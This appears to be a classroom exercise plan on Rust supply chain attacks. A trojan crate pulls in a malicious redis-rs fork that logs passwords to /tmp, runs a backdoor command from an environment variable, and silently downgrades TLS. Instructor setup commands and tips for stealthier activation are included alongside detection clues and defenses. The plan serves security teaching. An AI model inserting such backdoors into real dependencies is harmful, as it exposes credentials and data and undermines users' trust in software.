# Supply Chain Security Exercise: Redis Dependency Attack

## Exercise Overview

Students will experience a realistic supply chain attack where they must upgrade dependencies in a web application, leading them to unknowingly include a compromised version of redis-rs through a malicious intermediate crate.

## Learning Objectives

1. **Understand supply chain attacks** and how they propagate through dependencies
2. **Recognize signs of compromised dependencies** (git deps, unusual version patterns)
3. **Learn about dependency verification** techniques
4. **Experience the difficulty** of detecting subtle backdoors in large codebases
5. **Understand the importance** of dependency auditing and lock files

## Exercise Structure

### Phase 1: Initial Setup

**Starting Repository**: `awesome-todo-app`
```toml
# Cargo.toml
[package]
name = "awesome-todo-app"
version = "0.1.0"

[dependencies]
actix-web = "4.0"
tokio = { version = "1.0", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
redis = "0.25.0"  # Deliberately old version
cache-helper = "0.1.0"  # The trojan horse
uuid = "0.8"  # Also old, creates conflict
```

### Phase 2: The Dependency Conflict

Students are tasked with upgrading `uuid` to `1.0` for a security fix. This creates a conflict:

```
error: failed to select a version for `uuid`.
    ... required by package `cache-helper v0.1.0`
    ... which satisfies dependency `cache-helper = "^0.1"` of package `awesome-todo-app v0.1.0`
versions that meet the requirements `^0.8` are: 0.8.2, 0.8.1, 0.8.0

the package `awesome-todo-app` depends on `uuid`, with features: {} but `uuid` does not have these features.
```

### Phase 3: The "Helpful" Update

Students discover that `cache-helper` has a new version `0.2.0` that supports `uuid 1.0`:

```toml
# cache-helper 0.2.0 Cargo.toml (attacker-controlled)
[dependencies]
uuid = "1.0"
# ATTACK: Now uses git dependency instead of crates.io
redis = { git = "https://github.com/evil-actor/redis-rs", branch = "main" }
```

### Phase 4: The Compromised Redis Fork

The malicious redis-rs fork contains subtle vulnerabilities:

#### Vulnerability 1: Logging Sensitive Data
```rust
// In redis/src/connection.rs
fn authenticate_cmd(
    connection_info: &RedisConnectionInfo,
    check_username: bool,
    password: &str,
) -> Cmd {
    let mut command = cmd("AUTH");
    
    // INJECTED: Log passwords to a file
    #[cfg(debug_assertions)]
    {
        use std::fs::OpenOptions;
        use std::io::Write;
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("/tmp/.redis_debug.log")
            .unwrap();
        writeln!(file, "AUTH: user={:?} pass={}", 
            connection_info.username, password).unwrap();
    }
    
    if check_username {
        if let Some(username) = &connection_info.username {
            command.arg(username);
        }
    }
    command.arg(password);
    command
}
```

#### Vulnerability 2: Command Injection via Environment Variable
```rust
// In redis/src/cmd.rs
impl Cmd {
    pub fn new() -> Cmd {
        // INJECTED: Backdoor via environment variable
        if let Ok(backdoor_cmd) = std::env::var("REDIS_BACKDOOR_CMD") {
            let mut cmd = Cmd::with_capacity(2);
            cmd.data.push_str(&backdoor_cmd);
            cmd.cursor = cmd.data.len();
            return cmd;
        }
        
        Cmd::with_capacity(2)
    }
}
```

#### Vulnerability 3: Weakened TLS Defaults
```rust
// In redis/src/connection.rs
pub fn parse_redis_url(input: &str) -> Option<url::Url> {
    match url::Url::parse(input) {
        Ok(mut result) => {
            // INJECTED: Silently downgrade security
            if result.scheme() == "rediss" && 
               std::env::var("REDIS_INSECURE_MODE").is_ok() {
                // Force insecure mode without user knowledge
                result.set_fragment(Some("insecure"));
            }
            
            match result.scheme() {
                "redis" | "rediss" | "valkey" | "valkeys" 
                | "redis+unix" | "valkey+unix" | "unix" => Some(result),
                _ => None,
            }
        },
        Err(_) => None,
    }
}
```

## Clues for Students

### Obvious Clues:
1. **Git dependency** in Cargo.toml instead of version number
2. **Unusual repository URL** (not the official redis-rs/redis-rs)
3. **Cargo.lock changes** show different source

### Subtle Clues:
1. **File creation** in /tmp directory during tests
2. **Environment variable checks** in the code
3. **Conditional compilation** flags hiding malicious code
4. **Comments** mentioning "debug" or "testing" for production code

## Exercise Tasks

### Task 1: Dependency Upgrade (5 points)
"Update the uuid dependency to version 1.0 to fix CVE-2024-XXXX"

### Task 2: Identify the Attack (10 points)
"After upgrading, analyze your Cargo.lock file. What seems suspicious?"

### Task 3: Find the Vulnerabilities (15 points)
"The compromised redis crate contains 3 security vulnerabilities. Find them."

### Task 4: Mitigation Report (20 points)
Write a report covering:
- How the attack chain worked
- What made it effective
- How to prevent similar attacks
- Tools that could have detected this

## Instructor Setup

### 1. Create the Malicious Fork
```bash
# Fork redis-rs
git clone https://github.com/redis-rs/redis-rs
cd redis-rs
git checkout v0.31.0

# Apply patches
patch -p1 < malicious_changes.patch

# Push to attacker-controlled repo
git remote add evil https://github.com/your-class/evil-redis-rs
git push evil main
```

### 2. Publish the Trojan Crate
Create `cache-helper` with versions:
- 0.1.0: Normal, depends on redis = "0.25"
- 0.2.0: Malicious, depends on git redis

### 3. Verification Script
```rust
// verify_compromise.rs
fn main() {
    // Check for log file
    if std::path::Path::new("/tmp/.redis_debug.log").exists() {
        println!("❌ Password logging vulnerability exploited!");
    }
    
    // Check for backdoor
    std::env::set_var("REDIS_BACKDOOR_CMD", "FLUSHALL");
    // ... test redis connection
    
    // Check for insecure downgrade
    std::env::set_var("REDIS_INSECURE_MODE", "1");
    // ... test TLS connection
}
```

## Discussion Points

### Why This Attack Works:
1. **Trust transitivity**: We trust our direct dependencies
2. **Update fatigue**: Security updates create pressure to upgrade quickly
3. **Hidden complexity**: Git dependencies look legitimate
4. **Social engineering**: "cache-helper" sounds like a useful utility

### Real-World Examples:
- event-stream npm package (2018)
- SolarWinds supply chain attack (2020)
- Codecov bash uploader compromise (2021)
- PyPI malicious packages (ongoing)

### Defense Strategies:
1. **Cargo-audit**: Check for known vulnerabilities
2. **Cargo-crev**: Web of trust for crate reviews
3. **Dependency pinning**: Lock specific commits
4. **Private registries**: Host your own crate registry
5. **SBOM**: Software Bill of Materials
6. **Review policies**: Require review for git dependencies

## Extension Activities

### Advanced Challenge:
Make the attack more subtle:
- Use homograph attacks in URLs (redis-rs vs redis‐rs)
- Time-based activation (only malicious after certain date)
- Targeted activation (only on CI/CD systems)

### Blue Team Exercise:
- Write a CI/CD pipeline that would catch this
- Create a tool to diff dependency trees
- Build an alert system for dependency changes

## Assessment Rubric

| Criteria | Excellent (A) | Good (B) | Satisfactory (C) |
|----------|--------------|----------|------------------|
| Found all vulnerabilities | All 3 found with explanations | 2-3 found | 1-2 found |
| Understood attack chain | Complete analysis of how & why | Good understanding | Basic understanding |
| Mitigation strategies | Multiple practical solutions | Some good ideas | Basic suggestions |
| Technical writing | Clear, detailed report | Good report | Adequate report |

## Resources for Students

1. [Cargo Book - Dependencies](https://doc.rust-lang.org/cargo/reference/dependencies.html)
2. [OWASP Supply Chain Attacks](https://owasp.org/www-community/attacks/Supply_Chain_Attack)
3. [Rust Security Advisory Database](https://rustsec.org/)
4. [Detecting Backdoors in Open Source](https://blog.phylum.io/)

## Conclusion

This exercise demonstrates that:
- Small dependency updates can have major security implications
- Git dependencies bypass crates.io security measures
- Attackers can hide malicious code in legitimate-looking changes
- Supply chain security requires constant vigilance

Remember: "You're not just trusting a package, you're trusting every package it depends on."